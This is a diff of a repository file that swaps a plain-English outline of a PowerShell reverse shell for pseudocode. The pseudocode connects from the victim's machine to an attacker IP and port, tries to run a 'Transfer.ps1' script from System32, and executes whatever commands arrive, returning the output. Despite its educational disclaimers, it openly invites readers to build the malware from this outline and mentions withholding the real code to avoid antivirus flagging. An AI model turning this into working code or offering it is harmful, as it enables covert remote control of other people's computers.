@@ -1,49 +1,55 @@
-### PowerShell Reverse Shell – Plain English Breakdown
-### I cannot provide the powershell script for obvious reasons, if i provided the entire script it will be flagged.
+#This is a sudo code for reverse shell pleas but your own code with the help of this sudo code.
+#The original code has not been shared publicly due to the risk of it being flagged by antivirus software.
+#WARNING: This code is provided solely for educational purposes.
+#It should only be used in authorized environments with explicit permission from system owners.
+#nauthorized use of this code may violate applicable laws and regulations.
+#Author: Subbu Krishna Raju
 
-### But i will be providing steps so that you can write it yourself.
+SET TargetIP = "192.168.1.16"
+SET Port = 1111
 
-<#⚠️ Disclaimer
-This project is intended solely for educational and ethical research purposes.
-It is designed to help cybersecurity students, red teamers, and penetration testers understand how reverse shells operate in controlled environments.
+TRY
+    CREATE TCP client with TargetIP and Port
+    GET network stream from client
+    CREATE stream writer from stream
+    CREATE stream reader from stream
+    SET writer to auto-flush
+    WRITE "Connected to PowerShell reverse shell" to writer
 
-Do not use this code on any system or network that you do not own or have explicit written permission to test. Unauthorized use of these techniques may be illegal and unethical.
+    TRY
+        EXECUTE script "C:\Windows\System32\Transfer.ps1"
+    CATCH
+        WRITE "\nWARNING !!!! \nTRANSFER MODULE MISSING" to writer
+    ENDTRY
 
-The author(s) of this repository do not condone or support any form of malicious activity and assume no liability for misuse of this content.
-#>
+    WHILE true
+        READ command from reader
+        IF command is "exit" OR command is null
+            BREAK loop
+        ENDIF
 
-<#
-1. **Set the IP address of the attacker's machine** — this is the system that will receive the reverse shell connection.
+        TRY
+            EXECUTE command and capture output
+        CATCH
+            SET output to error message
+        ENDTRY
 
-2. **Pick a port number** that the attacker is listening on — for example, port 1111.
+        WRITE output to writer
+    ENDWHILE
 
-3. **Try to open a network connection** (a TCP client) from the victim's machine to the attacker's IP and port.
-
-4. Once the connection is open:
-
-   * Start reading and writing messages over the connection.
-   * Get ready to send text to the attacker.
-   * Also prepare to read text (commands) from the attacker.
-
-5. **Send a message back** to the attacker to confirm that the reverse shell is connected successfully.
-
-6. Enter a loop that runs forever:
-
-   * Wait for a command to come in from the attacker.
-   * If the command is missing or says "exit", break the loop and stop everything.
-   * Otherwise, try to run the command using PowerShell on the victim's machine.
-
-     * If the command runs successfully, capture the output.
-     * If there's an error, capture the error message instead.
-   * Send whatever output or error you got back to the attacker's machine.
-
-7. If the original connection fails for any reason, show an error saying the connection didn’t work.
-
-8. When everything is done or something goes wrong, close:
-
-   * The writer (sending messages),
-   * The reader (receiving commands),
-   * The network stream,
-   * And the client connection itself — to clean up resources.
-
-#>
+CATCH
+    // Handle connection errors (empty in original script)
+FINALLY
+    IF writer exists
+        CLOSE writer
+    ENDIF
+    IF reader exists
+        CLOSE reader
+    ENDIF
+    IF stream exists
+        CLOSE stream
+    ENDIF
+    IF client exists
+        CLOSE client
+    ENDIF
+ENDTRY
